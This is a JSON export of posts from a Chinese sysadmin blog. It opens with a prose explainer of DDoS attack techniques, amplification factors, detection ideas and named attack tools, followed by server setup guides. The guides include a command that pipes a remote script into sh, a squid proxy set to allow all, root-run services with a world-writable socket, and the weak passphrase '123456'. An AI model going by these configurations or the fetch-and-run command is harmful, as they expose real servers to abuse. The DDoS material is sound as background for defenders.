[{"title":"DDOS深度剖析","date":"2018-08-29T07:03:22.000Z","path":"2018/08/29/DDOS详解/","text":"一、简介：DDOS（分布式拒绝服务攻击），是指通过大量合法的请求占用大量网络资源，从而使合法用户无法得到服务的响应；是目前最强大、最难防御的攻击之一。其使用者一般是黑客个体、政治宗教或商业组织、国家和群体组织；其攻击事件的特点分别有兴趣炫耀、勒索竞争或报复、网络战争和表达主张。 二、DDOS攻击的方法2.1、攻击网络带宽资源利用受控主机发送大量网络数据包，占满被攻击目标的全部带宽，从而使正常的请求无法得到及时有效的响应。其攻击方式有直接攻击、反射和放大攻击、链路攻击。 2.1.1、直接攻击使用大量受控主机直接向目标发送大量网络数据包，以占满被攻击目标的带宽，并消耗服务器和网络设备的网络数据处理能力，达到拒绝服务的目的。直接攻击的方法有两种，ICMP/IGMP洪水攻击和UDP洪水攻击。 ICMP/IGMP洪水攻击 网络控制消息协议（ICMP）用于在TCP/IP网络中发送控制消息，提供可能发生在通信环境中各种问题的反馈。组管理协议（IGMP）是用于管理因特网多播组成员的一种通讯协议，主机通常和相邻的路由器利用IGMP来建立组成员。攻击者使用受控主机向目标发送大量ICMP/IGMP报文进行洪水攻击，消耗目标的带宽资源。一般使用hping发起攻击。但是这种攻击不多见，因为攻击目标可以在网络边界直接过滤并丢掉ICMP/IGMP数据包就使攻击无效了。识别此类攻击，可以在一定时间间隔内对ICMP/IGMP报文进行统计，达到特定阈值就认为是ICMP/IGMP洪水攻击。 UDP洪水攻击 用户数据协议（UDP）是一种面向无连接的传输层协议，主要用于不要求分组顺序到达的传输，提供面向事务的不可靠的信息传输。UDP洪水攻击和ICMP/IGMP攻击类似，不过其又分为大包攻击和小包攻击。大包指1500字节以上的数据包，其大小超过以太网最大传输单元；使用大包攻击能够有效的占用网络接口的传输带宽，并迫使被攻击目标接收到UDP数据时进行分片重组，造成网络阻塞，服务器响应速度变慢。小包指64字节大小的数据包，是以太网传输数据帧的最小单元；在相同流量下单包体积越小数据包的数量就越多，由于交换机路由器等网络设备需要对每一个数据包检查和校验，因此使用小包攻击能够有效的增大网络设备处理数据包的压力，造成网络阻塞。常用发送UDP洪水攻击的工具有hping和LOIC。但是这种攻击完全依赖受控主机本身的网络性能，通常对攻击目标带宽消耗并不大。识别此类攻击，可以在一定时间内对UDP报文进行统计，达到阈值就认为是UDP攻击。 2.1.2、反射和放大攻击反射攻击是指利用路由器、服务器等对请求产生应答，从而反射攻击流量并隐藏攻击来源的一种分布式拒绝服务攻击。当反射器具有放大功能的时候，就是放大攻击。在进行反射攻击的时候攻击者利用受控主机发送大量伪造的请求包，这些请求包的目的地址是反射器，源地址是被攻击目标的地址；反射器接收到数据包的时候会认为数据包是从被攻击目标发送来的，因此会将响应包发送给被攻击目标；当大量的响应数据包涌向被攻击目标时，就会耗尽目标的网络带宽，造成拒绝服务。但是反射攻击哟一个条件要求，就是需要使用无需认证或握手的协议；如果使用认证或握手的协议，则该认证或握手无法完成，也就不能进行下一步的攻击了。因此绝大多数反射攻击都是基于UDP协议进行的。反射和放大攻击包括ACK反射攻击、DNS放大攻击、NTP放大攻击和SNMP放大攻击。 ACK反射攻击 在TCP三次握手过程中，服务端收到客户端发来的SYN请求时会做出ACK应答。如果把SYN数据包的源IP修改为被攻击目标的IP时，服务端就会把ACK响应包发送至被攻击目标；当攻击者通过受控主机向大量不同的服务器发送伪造源IP的SYN请求，大量ACK应答就会涌向被攻击目标，会消耗掉攻击目标的带宽资源。在发射ACK攻击的时候，需要进行大量扫描来获得大量的反射器，并向这些反射器发送伪造源地址的SYN请求数据。可以在一段时间内统计SYN数据报文，达到阈值时认为时ACK攻击，但无法分辨放大攻击。 DNS放大攻击 域名系统（DNS）是一个将域名与IP相互映射的一个分布式数据库，其使用的TCP和UDP端口均是53，主要使用UDP协议。通常，DNS响应数据会比查询数据大，攻击这些可以利用这个放大功能来发起放大攻击。攻击者利用dig查询命令，将OPT RR字端的UDP报文设置为很大的之（如4096），并将源IP修改为被攻击目标的IP，DNS解析器收到查询数据解析后会将结果发送给被攻击目标。大量解析数据涌向被攻击目标时造成拒绝服务。攻击者发送的DNS查询数据包一般情况下其大小为60个字节左右，查询返回的数据包大小通常是3000个字节大小，因此使用该方法可以放大50倍以上；这种放大效应非常惊人，只需要发送2G流量就会产生100G的效果。使用DNS放大攻击，也需要先扫描来获取大量DNS解析器的地址，并向解析器发送伪造的查询数据。可以识别对方53端口过来的数据包，达到特定阈值后认为是DNS攻击，同样无法识别是否是放大攻击。 NTP放大攻击 网络时间协议（NTP）是使计算机时间同步化的一种协议，适应的是UDP 123端口通讯。在NTP协议的服务器上通常会实现一系列Mode7的调试接口，而接口中的monlist请求能获取到与目标NTP服务器进行同步的最后600个客户端的ip等信息。这意味着只要一个很小的请求包，就能触发大量连续的包含ip地址信息的UDP响应数据包。当向NTP服务器发送600个不超过64字节的请求包（64k）时，可以实现NTP放大倍数在700倍以上，并且在该服务器的NTP服务关闭或重启之前会一直保持这个倍数。发动NTP放大攻击时，也需要扫描来获取大量的NTP服务器。可以统计对方123端口过来的流量，达到阈值后认为是NTP攻击，但无法识别是否放大攻击。 SNMP放大攻击 简单网络管理协议（SNMP），提供一个管理框架来监控和维护互联网设备，使用的是UDP 161端口通讯。攻击者向广泛存在并开启SNMP服务的网络设备发送GetBulk请求，使用默认的通讯字符窜作为认证评据，并将源ip修改为攻击目标的ip；设备接收到GetBulk请求后，会将响应结果发送给攻击目标。当大量响应结果涌向攻击目标时就造成了拒绝服务。一般情况下，请求数据包大小为60字节，响应数据包在1500字节以上，放大倍数在25倍以上。发起SNMP放大攻击时，也需要扫描开启SNMP服务的设备，然后对他们的默认字符窜进行猜解，然后再伪造数据包，利用起来比见困难。可以统计对方161端口过来的流量，达到阈值后认为是NTP攻击，但无法识别是否放大攻击。 2.1.3、链路攻击对链路进行攻击的典型方式是Coremelt，前提是攻击者需要控制一个分布足够广的僵尸网络。攻击者通过traceroute来判断各个僵尸主机和要攻击的链路的位置关系，并将僵尸主机分为两波，让链路一端的主机与另一端的主机进行大量通讯，造成网络阻塞和延时。从效果上来看，这些主机之间相互收发的数据包确实是真实存在的通讯数据，没有办法将这些通讯数据与真正合法的通讯数据有效的区分，因此比较难以防护和缓解。 2.2、攻击系统资源消耗系统资源的分布是拒绝服务攻击主要目的是对系统维护的连接资源进行消耗和占用，阻止正常的连接的建立，从而达到拒绝服务的目的。其分为攻击TCP连接、攻击SSL连接。 2.2.1、攻击TCP连接TCP连接包括三个阶段，连接创建、数据传送和连接中止。由于协议的设计过程中只专注协议的可用性，没有对协议的安全性进行考虑，因此在TCP连接的三个阶段都容易受到拒绝服务攻击的影响。 TCP连接洪水攻击 TCP洪水攻击，是在连接创建阶段对TCP资源进行攻击。在三次握手中，服务器会创建并保存TCP连接信息，这个信息被保存在连接结构表中。但是结构表是有大小限制的，一旦服务器连接数超过连接表能存储的最大值时，服务器就无法再创建新的TCP连接了。攻击者可以利用大量受控主机快速创建大量的恶意TCP连接占满被攻击目标的连接表，使目标无法接受新的TCP连接，达到拒绝服务的目的。可以在特定时间内统计特定主机创建TCP连接的次数来识别此种攻击。 SYN洪水攻击 在TCP连接建立的过程中，如果服务器返回的SYN+ACK报文客户端没有进行确认，这是服务器就需要重新传递SYN+ACK报文，并等待确认，直到连接超时；这样的连接称为半开连接。如果在短时间内，产生大量的半开链接，而这些连接又无法很快结束，就会占满连接表，导致TCP连接的无法建立。攻击者可以利用受控主机发送大量的SYN报文并不对返回的SYN+ACK报文进行确认来发起攻击；这样的攻击会暴露攻击者的IP，同时响应报文会作为反射流量占用攻击者的带宽；所以更好的方式是将SYN报文的源IP伪装成随机的或不存在的IP地址。可以在特定时间内统计服务端接收到SYN报文后返回的SYN+ACK报文的次数，如果是多次就认为是SYN洪水攻击。 PSH+ACK洪水攻击 在TCP数据传输过程中，可以通过设置PSH标志位来表示当前数据传输结束。当服务端接收到一个设置了PSH+ACK标志的报文时，意味着当前传输数据结束，需要立即把当前数据递交给服务进程并清空缓冲区。当受控主机向目标发送大量的PSH+ACK数据包时，被攻击目标就会消耗大量的系统资源不断的清空缓冲区，导致无法正常处理数据，造成拒绝服务。单独使用PSH+ACK攻击的效果并不明显，更有效的方式是SYN攻击与ACK攻击相结合，这样能绕过一部分防护设备。可以统计单位时间内PSH+ACK报文的数量，达到特定阈值，就认为是PSH+ACK攻击。 RST洪水攻击 在TCP的结束阶段需要四次挥手来切断客户端与服务端的连接，如果任何一端出现异常无法完成四次挥手时，就会使用RST（复位）报文来强制中断连接。当服务端接收到RST报文时会清空缓冲区并关闭连接。攻击者可以发送伪造的带有RST标志位的报文强中断客户端与服务端的连接；但是在伪造RST报文时攻击者需要知道客户端的IP和端口，并使RST报文的序列号处于服务器的接收窗口之内，这是比较难的。通常攻击者会使用大量受控主机猜测端口和序列号，进行盲打。这种攻击通常用在在线游戏或比赛中，从而影响比赛结果并获取一定的经济利益。可以统计单位时间内服务端收到的RST报文的数量来识别。 Sockstress攻击 Sockstress攻击不需要在短时间内发送大量的请求，不属于洪水攻击，是一种慢速攻击。TCP在传输数据时并不是直接将数据递交给应用程序处理，而是先放在缓冲区；该缓冲区的大小是由TCP窗口表示的，如果TCP窗口大小为0时，表示缓冲区已满，发送端应该停止发送，直到窗口跟新。攻击者在三次握手建立的最后一次ACK应答中，将TCP窗口大小改为0并随后进行一次请求；被攻击者传输数据时发现接收端TCP窗口为0，就会停止传输数据并发出TCP窗口探测数据包询问TCP窗口是否有跟新；由于攻击者没有修改自己的TCP窗口的大小，被攻击目标就会一直维持TCP连接等待数据发送，并不断探测TCP窗口大小。如果攻击者利用大量受控主机发起Sockstress攻击，被攻击目标就会一直维持大量的TCP连接，直至TCP连接表被耗尽无法再建立新的TCP连接，达到拒绝服务的目的。识别此类攻击，单位时间内统计TCP窗口探测报文，理论上是可行的。 2.2.2、攻击SSL连接安全套接字（SSL）是为网络通讯提供安全及数据完整性的一种安全协议，能够在传输层对网络连接进行加密以防止传输的数据被明文监听。然而，加密和解密的过程很消耗服务端系统资源；在极端的情况下，服务端消耗的资源是客户端的25倍之多。攻击者可以利用ssl消耗资源的特性发起拒绝服务攻击。主要包括THC SSL DDOS和SSL洪水攻击。 THC SSL DDOS 在进行SSL数据传输之前，通信双方首先进行SSL握手，以协商加密算法交换加密密钥，进行身份验证。通常情况下一次SSL握手就可以了，但是SSL协议中有一个Renegotation选项，通过它可以进行密钥的重新协商以建立新的密钥。攻击者在建立SSL链接并握手之后，反复不断的进行密钥重新协商，而这个过程服务器消耗的CPU资源是客户端的15倍；这样攻击者只需要一台普通的计算机就能够拖慢一台高性能服务器；如果大量主机同时攻击，则会使服务器忙于协商密钥而完全停止响应。 SSL洪水攻击 在SSL握手的过程中，服务端会消耗较大的CPU资源进行加解密，然后进行数据的有效性校验；重要的是，无论数据是否有效，服务器都必须先解密再校验。攻击者通常使用SSL Squeeze等工具在SSL握手过程中，让服务器去解密和校验就能达到攻击的目的。可以在单位时间内检测SSL握手过程是否完成来识别此种攻击方法。 2.3、攻击应用资源攻击应用资源，是通过向应用提交大量消耗资源的请求，从而达到拒绝服务的目的。包括攻击DNS服务、攻击web服务。 2.3.1、攻击DNS服务攻击DNS的方法主要有DNS QUERY洪水攻击和DNS NXDOMAIN洪水攻击两种 DNS QUERY洪水攻击 DNS QUERY洪水攻击是指向DNS发送大量的查询请求，达到拒绝服务的效果的一种攻击。在DNS解析过程中，客户端发器一次请求DNS服务器可能需要进行额外的多次查询才能返回结果，如果攻击者使用大量受控主机不断的发送不同域名的解析请求，那么DNS的缓存会不断的刷新，而大量的请求不能命中又会导致DNS服务器消耗额外的资源迭代查询，这会极大的消耗DNS服务器的资源，导致DNS响应缓慢甚至完全拒绝服务。 DNS NXDOMAIN洪水攻击 DNS NXDOMAIN洪水攻击是DNS QUERY洪水攻击的变种，区别是后者查询的是存在的域名，前者查询的是不存在的域名。最终的结果比后者的效果好。 2.3.2、攻击web服务针对web的拒绝服务攻击包括HTTP洪水攻击、Slowloris攻击、慢速POST请求攻击和数据处理过程攻击。 HTTP洪水攻击 在处理HTTP请求时，服务器通常需要解析、处理和执行服务端脚本、验证用户名权限并多次访问数据库，会消耗大量的计算资源，IO资源和访问资源。如果攻击者利用大量的受控主机不断的向web服务器发送HTTP请求，就会消耗服务器资源，这就是HTTP洪水攻击。由于HTTP是基于TCP协议的，需要完成三次握手建立TCP链接才能开始HTTP通讯，因此HTTP洪水攻击无法伪造源IP，攻击者常使用HTTP代理服务器来隐蔽攻击和提高攻击效率;攻击者连接代理发送请求后可以直接与该代理端开连接并开始连接下一个代理的连接，这时候代理与服务器之间的HTTP连接依然保持。通过统计单位时间内特定主机的HTTP请求数量，大致来识别出此种攻击。 Slowloris攻击 Slowloris攻击是针对web服务器的慢速HTTP攻击。在HTTP协议中，HTTP头部以连续的”\\r\\n\\r\\n”作为结束的标志；许多web服务器在处理HTTP头信息的时候会等待头部传输结束后再处理，如果没有接收到这样的标志时web服务器一直处于接收数据并保持与客户端连接的状态。攻击者发送HTTP GET请求时缓慢的发送无用的header字段，并一直不发送结束的标志，这样就能够长时间占用web服务器的连接并保持该连接不超时不中断；大量的受控主机发送这种攻击时就引起拒绝服务。攻击者常使用Soloris和slowhttptest等工具发起Sloworis攻击。但是IIS和nginx修复了漏洞，不受影响，apache和dhttpd等web服务器还受影响。可以通过检测HTTP头信息中是否含有结束标志来识别此种攻击。 慢速POST请求攻击 慢速POST请求攻击利用缓慢发送HTTP BODY的方式长时间占用并消耗web服务器的连接资源，达到拒绝服务的目的。在HTTP头信息中，可以使用Content-Length字段来指定body的长度，服务器会持续接收数据并达到这个值时才会对body进行处理。攻击者发送HTTP POST请求时，把Content-Length值设置为一个很大的值，并将body以非常慢的速度向web服务器发送，这样攻击者就可以长时间占用该连接并保持不中断；当大量这样的攻击就造成拒绝服务。攻击者经常使用slowhttptest等发送慢速POST攻击。所有web服务器都受影响。可以通过检测Content-Length的长度来大致识别此种攻击。 数据处理过程攻击 数据处理过程攻击是在web服务器处理数据的时候，通过构造恶意请求数据的内容，可以显著的增加数据处理过程中消耗的资源，大量的攻击就造成了拒绝服务。如正则表达式拒绝服务攻击，在处理请求数据时，web服务器通常会使用正则表达式进行字符窜的匹配，这个过程较耗资源。 三、DDOS攻击的工具： 综合性工具 Hping：发起ICMP洪水攻击、UDP洪水攻击、SYN洪水攻击。 PenTBox：SYN FLOOD等，具有伪造源地址的功能。 Zarp：SYN洪水攻击等。 压力测试工具 LOIC：TCP，UDP，HTTP GET。 HOIC：HTTP FLOOD。 HULK：HTTP GET FLOOD，可以伪造user-agent。 专业工具 slowloris：slowloris攻击。 R.U.D.Y.：慢速HTTP POST攻击。 THC SSL DOS：SSL DOS攻击。","tags":[{"name":"ddos","slug":"ddos","permalink":"http://www.an-time.top/tags/ddos/"},{"name":"破坏之王","slug":"破坏之王","permalink":"http://www.an-time.top/tags/破坏之王/"}]},{"title":"docker从入门到实践","date":"2018-07-06T01:49:42.000Z","path":"2018/07/06/docker从入门到实践/","text":"简介: 最近发了两天时间，把docker从入门到实践重新读了一遍，又有新的收获，记录一下。 链接:https://docker_practice.gitee.io/","tags":[{"name":"docker","slug":"docker","permalink":"http://www.an-time.top/tags/docker/"}]},{"title":"ubuntu16.04搭建nginx+php7环境","date":"2018-06-26T02:39:15.000Z","path":"2018/06/26/ubuntu16-04搭建nginx-php7环境/","text":"简介：公司一直使用nginx+php-fpm的方式来构建网站，记录一下构建过程。使用的是ubuntu16.04和php7。 安装：$ apt install nginx php -y $ apt-get -y install php7.0-mysql php7.0-curl php7.0-gd php7.0-intl php-pear php-imagick php7.0-imap php7.0-mcrypt php-memcache php7.0-pspell php7.0-recode php7.0-sqlite3 php7.0-tidy php7.0-xmlrpc php7.0-xsl php7.0-mbstring php-gettext php-bcmath php7.0-pdo-pgsql $ apt-get -y install php-apcu $ systemctl reload php7.0-fpm.service ok,至此就安装完成了，而且常用插件都包含在内；若有其他需要另行安装。 配置网站： 创建网站目录 $ mkdir -p /srv/www/www.myweb.com 创建网站配置文件 $ vim /etc/nginx/site-available/myweb.com $ cat /etc/nginx/site-available/myweb.com server { listen 80; server_name www.myweb.com; server_name_in_redirect off; index index.html index.htm index.php; root /srv/www/www.myweb.com; error_page 400 403 404 500 502 503 504 /50x.html; location = /50x.html { root html; } location / { try_files $uri $uri/ /index.php$is_args$query_string; } location ~ .*\\.(php|php5)?$ { fastcgi_pass unix:/run/php/php7.0-fpm.sock; include snippets/fastcgi-php.conf; } location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ { expires 1d; } location ~ .*\\.(js|css)?$ { expires 1h; } location ~ /\\.ht { deny all; } } $ ln -s /etc/nginx/sites-available/www.myweb.com /etc/nginx/site-enable/www.myweb.com 下载配置 $ nginx -s reload #参考：https://linuxconfig.org/basic-php-7-and-nginx-configuration-on-ubuntu-16-04-linux","tags":[{"name":"nginx","slug":"nginx","permalink":"http://www.an-time.top/tags/nginx/"},{"name":"ubuntu16.04","slug":"ubuntu16-04","permalink":"http://www.an-time.top/tags/ubuntu16-04/"},{"name":"php7","slug":"php7","permalink":"http://www.an-time.top/tags/php7/"}]},{"title":"gitosis仓库搭建及使用","date":"2018-05-31T02:04:37.000Z","path":"2018/05/31/gitosis仓库搭建及使用/","text":"简介：gitosis是一个无界面的远程git仓库 安装： 安装: $ git clone https://github.com/tv42/gitosis.git $ cd gitosis $ sudo python setup.py install 配置： $ useradd git $ echo &apos;PATH=/usr/local/bin:/usr/local/bin/git:$PATH&apos; /home/git/.bashrc $ ssh-keygen -t rsa $ cp ~/.ssh/id_rsa.pub /tmp/id_rsa.pub $ sudo -H -u git gitosis-init &lt; /tmp/id_rsa.pub 添加新仓库： $ git clone git@localhost:gitosis-admin.git $ cd gitosis-admin $ cat gitosis.conf [gitosis]","tags":[{"name":"git","slug":"git","permalink":"http://www.an-time.top/tags/git/"},{"name":"gitosis","slug":"gitosis","permalink":"http://www.an-time.top/tags/gitosis/"}]},{"title":"使用supervisord在virtualenv环境部署django项目","date":"2018-05-09T13:09:57.000Z","path":"2018/05/09/使用supervisord在virtualenv环境部署django项目/","text":"简介：部署Django项目，一般都是使用nginx+uwsgi+supervisor。但是要在同一台机器上部署多个Django项目，而且每个项目依赖的环境不同，就需要用到虚拟环境了；常用的虚拟环境有virtualenv。 步骤： 安装软件： # pip install virtualenv # pip install uwsgi # pip install supervisor 初始化环境： # virtualenv -p /usr/bin/python3.6 /root/conf 配置uwsgi： # cat /opt/conf/vhost/uwsgi.ini [uwsgi] processes = 4 master = true vacuum = true uid = root gid = root socket = :8001 chmod-socket = 666 chdir = /srv/www/pre/nuts-backend/nuts wsgi-file = /srv/www/pre/nuts-backend/nuts/nuts/wsgi.py virtualenv = /root/conf #指定虚拟环境的路径 #home = /root/conf memory-report = true single-interpreter = true enable-threads = true ignore-sigpipe = true ignore-write-errors = true # uwsgi queue config reload-mercy = 360 buffer-size = 40480 max-requests=5000 # uwsgi logs log-date = true log-4xx = true log-5xx = true log-ioerror = true log-slow = true #disable-logging = true log-format = uwsgi:%(addr) - %(user) [%(ltime)] &quot;%(method) %(uri) %(proto) [%(host)] - %(msecs)ms&quot; %(status) %(size) &quot;%(referer)&quot; &quot;%(uagent)&quot; logto = /srv/www/logs/pre-uwsgi.log 配置supervisor： # cat /etc/supervisor/conf.d/uwsgi.conf [program:uwsgi] command=/srv/www/nuts-backend/conf/bin/uwsgi --emperor /opt/config/vhost #--ini /opt/config/vhost/service.ini priority=10 user=root group=root log-date = true logto = /var/log/uwsgi.log 配置nginx： # cat /etc/nginx/sites-enable/web.conf server { server_name www.baidu.com; access_log /var/log/nginx/nuts-dev.ddapp.com.access.log; error_log /var/log/nginx/nuts-dev.ddapp.com.error.log; listen 80; location / { uwsgi_pass 127.0.0.1:8000; include uwsgi_params; } location ^~ /media/ { alias /srv/www/public_html/media/; } location ^~ /static/ { alias /srv/www/public_html/static/; } } 启动supervisord,nginx即可对外提供服务 其他：对于在virtualenv环境中使用celery的django部署，需要对celery的supervisord配置文件中配置environment参数： # cat celery_sup.conf [program:pre-worker] environment=PATH=&quot;/srv/www/pre/nuts-backend/env/bin&quot; #配置虚拟环境 directory=/srv/www/pre/nuts-backend/nuts/ command=/srv/www/pre/nuts-backend/env/bin/celery worker -A nuts -l info stdout_logfile=/var/log/nuts/pre_celery_worker.log autorestart=true redirect_stderr=true priority=10 user=root group=root [program:pre-celery-beat] environment=PATH=&quot;/srv/www/pre/nuts-backend/env/bin&quot; #配置虚拟环境 directory=/srv/www/pre/nuts-backend/nuts/ command=/srv/www/pre/nuts-backend/env/bin/celery -A nuts beat -l info --scheduler django_celery_beat.schedulers:DatabaseScheduler stdout_logfile=/var/log/nuts/pre_celery_beat.log autorestart=true redirect_stderr=true priority=10 user=root group=root 参考：https://www.cnblogs.com/xueweihan/p/6195824.htmlhttps://www.cnblogs.com/xueweihan/p/6195824.htmlhttps://blog.csdn.net/orangleliu/article/details/45066157","tags":[{"name":"python","slug":"python","permalink":"http://www.an-time.top/tags/python/"},{"name":"django","slug":"django","permalink":"http://www.an-time.top/tags/django/"}]},{"title":"内网机器使用squid做代理访问外网","date":"2018-03-26T03:38:47.000Z","path":"2018/03/26/内网机器使用squid做代理访问外网/","text":"场景：阿里云购买了一批内网机器，安装软件包的时候发现无法访问外网，于是乎在一台内网机器上绑定了一个弹性公网ip地址，在该机器上架设一个代理供其他内网机器上外网。 代理机：# apt install squid -y # cd /etc/squid # cp squid.conf squid.conf_bak # vim squid.conf 在该文件中找到 http_access deny all ,并将其改为http_access allow all 表示所有用户都可以访问这个代理，然后重启squid。 # systemctl restart squid 内网机器设置：在其他内网机器上导入环境变量，即可访问外网了。 export http_proxy=http://ip:3128 export https_proxy=http://ip:3128 但是这样都是针对本次生效的，shell关闭后下次打开就不可以使用了，于是写入 /etc/profile中使其永久生效。 # vim /etc/profile 在最后一行加上下面的命令 # export http_proxy=http://ip:3128 # export https_proxy=http://ip:3128 若要让运行的代码也能访问外网，需要在代码中设置代理即可。","tags":[{"name":"网络","slug":"网络","permalink":"http://www.an-time.top/tags/网络/"}]},{"title":"nginx实现手机浏览自动跳转","date":"2018-02-12T12:24:33.000Z","path":"2018/02/12/nginx实现手机浏览自动跳转/","text":"简介：业务需求，需要手机访问与pc访问时，转发到不同的地址，但是码农们计较懒，不愿意直接在代码中判断，于是乎，直接在nginx做判断实现跳转。 实现：分为两种情况，一种是手机端和pc端的网站是独立的目录，第二种是二者揉合在一起。 相互独立：手机端网站根目录：/var/www/html/mobilepc端网站根目录：/var/www/html/pc这种情况比较好弄，只需在location下做个判断，符合条件就修改根目录即可。配置文件如下： location / { #默认PC端访问内容 root /var/www/html/pc; #如果是手机移动端访问内容 if ( $http_user_agent ~ &quot;(MIDP)|(WAP)|(UP.Browser)|(Smartphone)|(Obigo)|(Mobile)|(AU.Browser)|(wxd.Mms)|(WxdB.Browser)|(CLDC)|(UP.Link)|(KM.Browser)|(UCWEB)|(SEMC-Browser)|(Mini)|(Symbian)|(Palm)|(Nokia)|(Panasonic)|(MOT-)|(SonyEricsson)|(NEC-)|(Alcatel)|(Ericsson)|(BENQ)|(BenQ)|(Amoisonic)|(Amoi-)|(Capitel)|(PHILIPS)|(SAMSUNG)|(Lenovo)|(Mitsu)|(Motorola)|(SHARP)|(WAPPER)|(LG-)|(LG/)|(EG900)|(CECT)|(Compal)|(kejian)|(Bird)|(BIRD)|(G900/V1.0)|(Arima)|(CTL)|(TDG)|(Daxian)|(DAXIAN)|(DBTEL)|(Eastcom)|(EASTCOM)|(PANTECH)|(Dopod)|(Haier)|(HAIER)|(KONKA)|(KEJIAN)|(LENOVO)|(Soutec)|(SOUTEC)|(SAGEM)|(SEC-)|(SED-)|(EMOL-)|(INNO55)|(ZTE)|(iPhone)|(Android)|(Windows CE)|(Wget)|(Java)|(curl)|(Opera)&quot; ) { root /var/www/html/mobile; } index index.html index.htm; } 揉合在一起：pc端地址：www.a.com手机端地址：www.a.com/m/index这时候就相对复杂了，如果和上面做法一样的话，手机端势必会引起死循环，导致最终访问的路径为www.a.com/m/index/m/index/m/index…….也就是说，手机访问www.a.com会转到www.a.com/m/index，但是此刻没有www.a.com/m/index，就会再次请求，如此反复。。。。。 这时候就不能在location里面做判断了；具体思路是手机端访问的话，把访问地址转换到pc端访问的地址，然后rewrite在后面加上路径/m/index，就不会造成死循环了。具体配置如下： server { listen 80; server_name www.a.com; root /path/to/www.a.com; # 检测是不是手机访问,是手机访问的话就把mobile_rewrite设置为perform set $mobile_rewrite do_not_perform; if ($http_user_agent ~* &quot;(android|bb\\d+|meego).+mobile|avantgo|bada\\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\\.(browser|link)|vodafone|wap|windows ce|xda|xiino&quot;) { set $mobile_rewrite perform; } if ($http_user_agent ~* &quot;^(1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\\-(n|u)|c55\\/|capi|ccwa|cdm\\-|cell|chtm|cldc|cmd\\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\\-s|devi|dica|dmob|do(c|p)o|ds(12|\\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\\-|_)|g1 u|g560|gene|gf\\-5|g\\-mo|go(\\.w|od)|gr(ad|un)|haie|hcit|hd\\-(m|p|t)|hei\\-|hi(pt|ta)|hp( i|ip)|hs\\-c|ht(c(\\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\\-(20|go|ma)|i230|iac( |\\-|\\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\\/)|klon|kpt |kwc\\-|kyo(c|k)|le(no|xi)|lg( g|\\/(k|l|u)|50|54|\\-[a-w])|libw|lynx|m1\\-w|m3ga|m50\\/|ma(te|ui|xo)|mc(01|21|ca)|m\\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\\-2|po(ck|rt|se)|prox|psio|pt\\-g|qa\\-a|qc(07|12|21|32|60|\\-[2-7]|i\\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\\-|oo|p\\-)|sdk\\/|se(c(\\-|0|1)|47|mc|nd|ri)|sgh\\-|shar|sie(\\-|m)|sk\\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\\-|v\\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\\-|tdg\\-|tel(i|m)|tim\\-|t\\-mo|to(pl|sh)|ts(70|m\\-|m3|m5)|tx\\-9|up(\\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\\-|your|zeto|zte\\-)&quot;) { set $mobile_rewrite perform; } # 检测访问的是不是PC版页面，不是的话就设置mobile_rewrite为performpc if ($document_uri !~ &apos;^/m/index&apos;) { set $mobile_rewrite &quot;${mobile_rewrite}pc&quot;; } location / { # 手机访问PC版页面，再跳转到/m/index if ($mobile_rewrite = performpc) { rewrite ^ /m/index$uri redirect; } index index.html; try_files $uri $uri/; } } 参考：参考地址1参考地址2","tags":[{"name":"nginx","slug":"nginx","permalink":"http://www.an-time.top/tags/nginx/"}]},{"title":"使用docker搭建openvpn服务器","date":"2018-02-07T02:37:19.000Z","path":"2018/02/07/使用docker搭建openvpn服务器/","text":"简介：OpenVPN 是一个基于 OpenSSL 库的应用层 VPN 实现。说白了，就是一个比传统vpn更安全更易用的开源VPN。 环境： Centos7 docker-18.01.0-ce 步骤： 安装docker： $ curl -sSL https://get.daocloud.io/docker | sh $ docker pull kylemanna/openvpn 设置环境变量： $ OVPN_DATA=&quot;/root/ovpn-data&quot; $ IP=&quot;xxx.xxx.xxx.xxx&quot; #机器的外网ip地址 $ mkdir ${OVPN_DATA} 获取配置： $ docker run -v ${OVPN_DATA}:/etc/openvpn --rm kylemanna/openvpn ovpn_genconfig -u tcp://${IP} 初始化： $ docker run -v ${OVPN_DATA}:/etc/openvpn --rm -it kylemanna/openvpn ovpn_initpki Enter PEM pass phrase: 输入密码123456（你是看不见的）Verifying - Enter PEM pass phrase: 输入123456（你是看不见的）Common Name (eg: your user, host, or server name) [Easy-RSA CA]:输入名字或直接回车Enter pass phrase for /etc/openvpn/pki/private/ca.key:输入123456 著：上述密码需要记清楚，以后会用到很多地方；比如client端设置为需要密码连接时，就用的是此密码。 创建用户： A):client端连接不需要密码： $ docker run -v ${OVPN_DATA}:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full CLIENTNAME nopass 